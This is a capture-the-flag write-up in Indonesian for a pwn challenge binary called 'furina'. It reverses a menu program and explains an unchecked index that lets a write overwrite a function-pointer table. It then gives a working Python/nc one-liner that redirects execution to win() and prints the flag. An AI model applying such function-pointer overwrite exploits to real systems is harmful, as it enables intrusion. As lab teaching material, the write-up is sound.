# pwn_furina — Writeup (Blackbox)

**Target:** `nc localhost 40301`
**Binary:** `furina` (ELF 64-bit, dynamically linked, not stripped)
**Flag:** `TecFest26{V0c4L_C0Rd5_r34dY_8l00d_5u94R_R3pl3N15H3d_L37_7h3_5h0w_8391N!}`

## 1. Recon

```
file furina
```
```
furina: ELF 64-bit LSB executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

Checksec (manual via `readelf`, `checksec` tidak terinstall di environment ini):

| Protection | Status |
|---|---|
| Canary | **Ada** (`__stack_chk_fail` dipanggil tiap fungsi) |
| NX | **Ada** (`GNU_STACK` = `RW`, tidak ada flag `E`) |
| PIE | **Tidak** (`ELF Type: EXEC`, alamat statis/fixed) |
| RELRO | Partial (ada segmen `GNU_RELRO`) |

Karena binary **non-PIE**, semua alamat fungsi (termasuk `win()`) tetap/fixed di setiap run — tidak perlu info leak untuk dapat alamatnya.

Simbol yang tidak di-strip (dari `nm`) langsung membocorkan nama-nama kunci:

```
0000000000401415 T main
0000000000401379 t read_long
0000000000401296 T verdict_placeholder
00000000004012e3 T win
00000000004040c0 B court     <- BSS, array global
0000000000404160 B flag      <- BSS, isi file flag di-load ke sini
```

> **Catatan revisi binary:** sempat ada perubahan minor pada binary (string debug `flag.txt` + pesan error lokal, menggantikan versi produksi yang baca file `flag`). Sudah di-diff full disassembly (`objdump`) antara versi lama & baru — **100% identik di luar string itu**, semua alamat (`main`, `win`, `read_long`, `court`) tetap sama. Juga sudah di-cross-check lewat Binary Ninja (MCP, `/reversing-ninja`) — pseudo-C `main()`/`win()`/`read_long()` cocok persis dengan hasil baca manual di bawah. Jadi exploit di writeup ini tidak terpengaruh oleh revisi tersebut.

## 2. Reverse Engineering (objdump + alur /reversing-ninja)

Tema: "Oratrice Mecanique D'Analyse Cardinale" (pengadilan Furina — Genshin). Menu via `nc`:

```
=== Oratrice Mecanique D'Analyse Cardinale ===
1. Catat catatan kasus (index, panjang, isi)
2. Jatuhkan putusan (index, a, b, c)
3. Keluar
>
```

### `main()`
- Load isi file `flag.txt` ke buffer global `flag` (0x404160).
- Inisialisasi `court[16..19]` (4 slot, masing-masing **8-byte function pointer**) dengan alamat `verdict_placeholder` — jadi `court` adalah array **jump table**, bukan sekadar buffer data biasa.
- Loop menu baca pilihan via `read_long()` (wrapper: `printf(prompt)` → `fflush` → `fgets(buf,0x40,stdin)` → `strtol(buf, NULL, 0)`, base 0 artinya input boleh ditulis desimal **atau hex `0x...`**).

### Pilihan **1 — "Catat catatan kasus"** (index, panjang, isi)
```c
idx = read_long("index: ");                 // long, TIDAK divalidasi!
len = read_long("panjang: ");                // divalidasi: 0 <= len <= 0x1000
// ...
read(0, (char*)court + idx*32, len);         // raw syscall read, bukan fgets
```
`idx` dipakai sebagai offset **tanpa bound check sama sekali**, dikali 32 byte (`shl 5`). Ini bug utamanya: **out-of-bounds / arbitrary-offset write** relatif terhadap alamat `court` — attacker bisa menulis ke slot function pointer `court[16..19]` yang dipakai oleh menu 2.

### Pilihan **2 — "Jatuhkan putusan"** (index, a, b, c)
```c
idx2 = read_long("index: ");      // divalidasi: 0 <= idx2 <= 3 (aman)
a = read_long("a: ");
b = read_long("b: ");
c = read_long("c: ");
fn = court[idx2 + 16];            // qword function pointer
fn(a, b, c);                      // dipanggil langsung!
```
`idx2` di sini DIVALIDASI (0..3), tapi karena tabel `court[16..19]` sendiri bisa ditimpa lewat bug di menu 1, validasi ini jadi tidak berarti.

### `win(a, b, c)`
```c
if (a == 0x1337 && b == 0xc0de && c == 0xf00dbeef) {
    fputs(flag, stdout);
    fflush(stdout);
} else {
    puts("Argumen putusan salah, sidang ditunda.");
}
```
Fungsi ini sudah ada di binary, hanya tidak pernah "ditunjuk" oleh `court` secara default (default-nya `verdict_placeholder`, yang cuma print "Putusan belum ditetapkan...").

## 3. Vulnerability

**Arbitrary-offset OOB write** pada `court` (menu 1, parameter `idx`) memungkinkan menimpa slot function pointer `court[16..19]` dengan alamat fungsi manapun di binary (termasuk `win`), karena:
1. `idx` di menu 1 tidak dibatasi (boleh negatif/besar, dikali 32 byte).
2. `court` adalah array campuran data-biasa (slot 0..15, awalnya nol/belum dipakai) **dan** jump table (slot 16..19).
3. Binary non-PIE → alamat `win` (`0x4012e3`) selalu sama → tidak perlu leak.

## 4. Exploit Plan

1. Hitung offset agar `idx*32` tepat jatuh di slot `court[16]`, yaitu byte-offset `(0+16)*8 = 128`. Maka `idx = 128/32 = 4`.
2. Menu **1**: `idx=4`, `panjang=8`, isi = alamat `win()` (`0x4012e3`) dalam 8 byte little-endian — menimpa `court[16]`.
3. Menu **2**: `idx2=0` (dipetakan ke `court[0+16] = court[16]`, slot yang baru ditimpa), kirim `a=0x1337`, `b=0xc0de`, `c=0xf00dbeef` (pakai notasi hex langsung, karena `strtol` dipanggil dengan base 0).
4. `win()` tereksekusi dengan argumen yang cocok → flag dicetak ke stdout.

Tidak perlu bypass canary, NX, atau PIE — bug ini murni logic bug (missing bounds check) yang langsung memberi control-flow hijack ke fungsi yang sudah ada di binary.

## 5. Exploit Script

### 5a. Script lengkap (recommended)

Lihat [`solve.py`](solve.py) — pure Python 3 standard library (`socket` + `struct`), tanpa pwntools:

```bash
python3 solve.py
```

Output (terpotong):
```
...
> index: a: b: c: TecFest26{V0c4L_C0Rd5_r34dY_8l00d_5u94R_R3pl3N15H3d_L37_7h3_5h0w_8391N!}
```

### 5b. Versi one-liner (`python3` + `nc`)

Karena seluruh payload bisa dikirim sekaligus tanpa perlu menunggu respons server di tengah jalan (tidak ada timing/race condition), exploit ini juga bisa dipadatkan jadi satu baris yang di-pipe ke `nc` — **sudah ditest dan terkonfirmasi jalan**:

```bash
python3 -c "import struct,sys; sys.stdout.buffer.write(b'1\n4\n8\n'+struct.pack('<Q',0x4012e3)+b'2\n0\n0x1337\n0xc0de\n0xf00dbeef\n3\n')" | nc localhost 40301
```

Breakdown payload-nya:
- `b'1\n4\n8\n'` → pilih menu 1, `index=4` (supaya `idx*32 == 128` byte, tepat ke slot `court[16]`), `panjang=8`.
- `struct.pack('<Q', 0x4012e3)` → isi 8 byte = alamat `win()`, little-endian — ini yang menimpa slot function pointer.
- `b'2\n0\n0x1337\n0xc0de\n0xf00dbeef\n3\n'` → pilih menu 2, `index=0` (slot yang sama, `court[16]`), lalu `a/b/c` sesuai yang dicek `win()`, terakhir `3` untuk keluar.

Kalau mau pakai `pwntools` (`p64()` bukan `struct.pack`), tinggal ganti baris `struct.pack('<Q', 0x4012e3)` jadi `p64(0x4012e3)` setelah `from pwn import *` — hasilnya identik, cuma beda library.

> Catatan: teknik format-string (`%n$n` + alamat target) **tidak berlaku** di binary ini — `furina` tidak punya format-string vulnerability (semua `printf`/`fprintf` pakai format string tetap). Bug di sini adalah OOB-index write biasa.

## 6. Catatan untuk Problem Setter

- Bug sangat jelas & reliable (tidak butuh brute force/race condition), cocok untuk kategori Pwn level menengah: mengajarkan konsep "index tidak divalidasi di satu path, tapi divalidasi di path lain yang membaca data yang sama" + konsep jump table di BSS.
- Karena non-PIE dan tidak ada leak yang dibutuhkan, difficulty-nya didominasi oleh reversing alur 2 menu + nama fungsi yang tidak di-strip (`win`, `verdict_placeholder`, `court`) sangat memudahkan examinasi — kalau mau menaikkan difficulty, bisa strip symbol table.
